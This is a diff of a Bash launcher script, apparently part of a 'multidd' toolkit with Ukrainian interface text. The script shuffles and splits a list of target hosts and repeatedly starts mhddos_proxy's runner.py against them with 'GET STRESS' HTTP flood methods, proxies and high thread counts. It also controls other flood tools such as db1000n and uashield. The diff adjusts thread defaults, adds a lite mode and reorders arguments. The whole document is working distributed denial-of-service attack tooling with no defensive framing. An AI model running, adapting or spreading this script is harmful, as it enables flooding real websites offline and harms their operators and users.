@@ -29,18 +29,17 @@ if [[ $docker_mode != "true" ]]; then
     db1000n="off"
     uashield="off"
     vnstat="off"
-    matrix="off"
     proxy_finder="on"
     export uvloop="on"
 fi
 
-if [[ $t_set_manual != "on" ]]; then
-    export threads="-t 5000"
-fi
+# if [[ $t_set_manual != "on" ]]; then
+#     export threads="-t 5000"
+# fi
 
-if [[ $t_proxy_manual != "on" ]]; then
-    export proxy_threads="2000"
-fi
+# if [[ $t_proxy_manual != "on" ]]; then
+#     export proxy_threads="2000"
+# fi
 
 export methods="--http-methods GET STRESS"
 
@@ -73,7 +72,7 @@ done
 # find only uniq targets, randomize order and save them in $targets_uniq
 cat $targets_line_by_line | sort | uniq | sort -R > $targets_uniq
 
-#split targets by line in N files
+#split targets in N files
 cd /var/tmp/
 split -n l/2 --additional-suffix=.uaripper $targets_uniq
 cd -
@@ -88,11 +87,11 @@ sleep 0.5
 echo -e "\n" && sleep 0.1
 echo -e "Total targets found:" "\x1b[32m $(cat $targets_line_by_line | wc -l)\x1b[m" && sleep 0.1
 echo -e "Uniq targets:" "\x1b[32m $(cat $targets_uniq | wc -l)\x1b[m" && sleep 0.1
-if [[ $threads == "" ]]; then
-    echo -e "\nКількість потоків:" "\x1b[32m $(echo "auto" | cut -d " " -f2)\x1b[m" && sleep 0.1
-else
-    echo -e "\nКількість потоків:" "\x1b[32m $(echo $threads | cut -d " " -f2)\x1b[m" && sleep 0.1
-fi
+# if [[ $threads == "" ]]; then
+#     echo -e "\nКількість потоків:" "\x1b[32m $(echo "auto" | cut -d " " -f2)\x1b[m" && sleep 0.1
+# else
+#     echo -e "\nКількість потоків:" "\x1b[32m $(echo $threads | cut -d " " -f2)\x1b[m" && sleep 0.1
+# fi
 echo -e "\nЗавантаження..."
 sleep 3
 clear
@@ -172,12 +171,12 @@ while [ "$1" != "" ]; do
         -g | --gotop ) gotop="off"; db1000n="off"; shift ;;
         +v | --vnstat ) vnstat="on"; shift ;;
         -p0| --no-proxy-finder ) export proxy_finder="off"; shift ;;
-        --lite ) export lite="on"; shift ;;
-        #-p | --proxy-threads ) export proxy_threads="$2"; shift 2 ;;
+        --lite ) export lite="on"; export proxy_threads=1000; shift ;;
+        -p | --proxy-threads ) export proxy_threads="$2"; shift 2 ;;
         --no-uvloop ) export uvloop="off"; shift ;;
         -h | --help )    usage;   exit ;;
         #*  )   usage;   exit ;;
-        *   ) export args_to_pass+=" $1"; shift 1; echo $args_to_pass && echo " v4" && sleep 2 ;;
+        *   ) export args_to_pass+=" $1"; shift 1; echo $args_to_pass && echo " v5" && sleep 2 ;;
     esac
 done
 
@@ -220,11 +219,11 @@ while true; do
     pkill -f start.py; pkill -f runner.py 
     if [[ $lite == "on" ]]; then
         tail -n 1000 $targets_uniq > $targets_lite
-        python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $args_to_pass -t 777 $methods&
+        python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $methods $args_to_pass -t 777 &
     else
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $args_to_pass $methods&
+        python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $methods $args_to_pass &
         sleep 10 # to decrease load on cpu during simultaneous start
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
+        python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $methods $args_to_pass &
         # sleep 10 # to decrease load on cpu during simultaneous start
         # python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
